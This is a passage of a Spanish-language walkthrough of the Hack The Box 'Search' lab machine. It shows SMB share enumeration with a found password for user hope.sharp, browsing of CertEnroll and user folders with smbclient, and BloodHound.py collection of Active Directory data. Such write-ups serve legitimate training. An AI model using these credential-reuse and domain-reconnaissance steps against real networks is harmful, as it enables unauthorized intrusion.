SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;17763&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:RESEARCH&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:search.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\h&lt;/span&gt;ope.sharp:IsolationIsKey?
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Enumerated shares
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         Share           Permissions     Remark
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         -----           -----------     ------
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         ADMIN$                          Remote Admin
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         C$                              Default share
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         helpdesk
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         IPC$            READ            Remote IPC
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         NETLOGON        READ            Logon server share
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         RedirectedFolders$ READ,WRITE
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         SYSVOL          READ            Logon server share
 œÄ ~/htb/search ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En &lt;code&gt;CertEnroll&lt;/code&gt; encontramos tres certificados, aunque no son para el sitio restringido.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search/certenroll ‚ùØ smbclient //search.htb/CertEnroll -U &lt;span class=&#34;s1&#34;&gt;&amp;#39;hope.sharp&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# IsolationIsKey?&lt;/span&gt;
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\h&lt;/span&gt;ope.sharp&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password:
Try &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                  Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 00:51:28 &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt;
  ..                                 Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 00:51:28 &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt;
  nsrev_search-RESEARCH-CA.asp       Ac      &lt;span class=&#34;m&#34;&gt;330&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 03:29:31 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  Research.search.htb_search-RESEARCH-CA.crt     Ac      &lt;span class=&#34;m&#34;&gt;883&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 03:29:29 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  search-RESEARCH-CA+.crl            Ac      &lt;span class=&#34;m&#34;&gt;735&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 00:51:28 &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt;
  search-RESEARCH-CA.crl             Ac     &lt;span class=&#34;m&#34;&gt;1047&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 00:51:28 &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt;

      &lt;span class=&#34;m&#34;&gt;3246079&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;420635&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En &lt;code&gt;RedirectedFolders$&lt;/code&gt; encontramos directorios con nombres de usuarios.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ smbclient //search.htb/RedirectedFolders$ -U &lt;span class=&#34;s1&#34;&gt;&amp;#39;hope.sharp&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# IsolationIsKey?&lt;/span&gt;
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\h&lt;/span&gt;ope.sharp&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password:
Try &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                  Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 22:27:00 &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt;
  ..                                 Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 22:27:00 &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt;
  abril.suarez                       Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 14:12:58 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  Angie.Duffy                        Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Jul &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 09:11:32 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  Antony.Russo                       Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Jul &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 08:35:32 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  belen.compton                      Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 14:32:31 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  Cameron.Melendez                   Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Jul &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 08:37:36 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  chanel.bell                        Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 14:15:09 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  Claudia.Pugh                       Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Jul &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 09:09:08 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  Cortez.Hickman                     Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Jul &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 08:02:04 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  dax.santiago                       Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 14:20:08 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  Eddie.Stevens                      Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Jul &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 07:55:34 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  edgar.jacobs                       Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Thu Apr  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 16:04:11 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  Edith.Walls                        Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Jul &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 08:39:50 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  eve.galvan                         Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 14:23:13 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  frederick.cuevas                   Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 14:29:22 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  hope.sharp                         Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Thu Apr  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 10:34:41 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  jayla.roberts                      Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 14:07:00 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  Jordan.Gregory                     Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Jul &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 09:01:06 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  payton.harmon                      Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Thu Apr  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 16:11:39 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  Reginald.Morton                    Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Jul &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 07:44:32 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  santino.benjamin                   Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 14:10:25 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  Savanah.Velazquez                  Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Jul &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 08:21:42 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  sierra.frye                        Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Nov &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 20:01:46 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  trace.ryan                         Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Thu Apr  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 16:14:26 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;

      &lt;span class=&#34;m&#34;&gt;3246079&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;420632&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos en el directorio de &lt;code&gt;sierra.frye&lt;/code&gt; la flag &lt;code&gt;user.txt&lt;/code&gt; pero no tenemos acceso a esta.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smb: &lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ierra.frye&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                 DRc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Nov &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 20:08:00 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  ..                                DRc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Nov &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 20:08:00 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  &lt;span class=&#34;nv&#34;&gt;$RECYCLE&lt;/span&gt;.BIN                     DHSc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 14:03:59 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  desktop.ini                      AHSc      &lt;span class=&#34;m&#34;&gt;282&lt;/span&gt;  Fri Jul &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 10:42:15 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  Microsoft Edge.lnk                 Ac     &lt;span class=&#34;m&#34;&gt;1450&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 08:28:05 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  user.txt                           Ac       &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt;  Wed Nov &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 19:55:27 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;

&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ierra.frye&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;RECYCLE.BIN
  .                                DHSc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 14:03:59 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  ..                               DHSc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 14:03:59 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  desktop.ini                      AHSc      &lt;span class=&#34;m&#34;&gt;129&lt;/span&gt;  Tue Apr  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 14:04:00 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;

      &lt;span class=&#34;m&#34;&gt;3246079&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;420632&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ierra.frye&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; get user.txt
NT_STATUS_ACCESS_DENIED opening remote file &lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ierra.frye&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;ser.txt
smb: &lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ierra.frye&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;smb---web_svc&#34;&gt;SMB - Web_svc&lt;/h1&gt;
&lt;h2 id=&#34;bloodhound&#34;&gt;BloodHound&lt;/h2&gt;
&lt;p&gt;Utilizamos &lt;a href=&#34;https://github.com/fox-it/BloodHound.py&#34;&gt;Bloodhound.py&lt;/a&gt; para obtener informaci√≥n del AD, utilizando las credenciales de &lt;code&gt;hope.sharp&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ BloodHound.py master ‚ùØ ./bloodhound.py -u hope.sharp -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;IsolationIsKey?&amp;#39;&lt;/span&gt; -d SEARCH.HTB -ns 10.10.11.129 -c all --zip
INFO: Found AD domain: search.htb
INFO: Connecting to LDAP server: research.search.htb
INFO: Found &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; domains
INFO: Found &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; domains in the forest
INFO: Found &lt;span class=&#34;m&#34;&gt;113&lt;/span&gt; computers
INFO: Connecting to LDAP server: research.search.htb
INFO: Found &lt;span class=&#34;m&#34;&gt;107&lt;/span&gt; users
INFO: Found &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt; groups
INFO: Found &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; trusts

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

INFO: Done in 00M 46S
INFO: Compressing output into 20220405224732_bloodhound.zip
  œÄ BloodHound.py master ‚ùØ l
total 1.9M
drwxr-xr-x  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; kali kali 4.0K Apr  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 23:07 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; kali kali 4.0K Apr  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 22:33 ..
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; kali kali 289K Apr  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 22:46 20220405224540_computers.json
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; kali kali 2.5K Apr  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 22:45 20220405224540_domains.json
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; kali kali  92K Apr  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 22:45 20220405224540_groups.json
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; kali kali 246K Apr  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 22:45 20220405224540_users.json
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; kali kali 202K Apr  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 22:47 20220405224652_computers.json
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; kali kali 2.5K Apr  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 22:47 20220405224652_domains.json
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; kali kali  92K Apr  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 22:47 20220405224652_groups.json
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; kali kali 246K Apr  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 22:46 20220405224652_users.json
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; kali kali 629K Apr  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 22:48 20220405224732_bloodhound.zip
drwxr-xr-x  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; kali kali 4.0K Mar  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 21:13 bloodhound
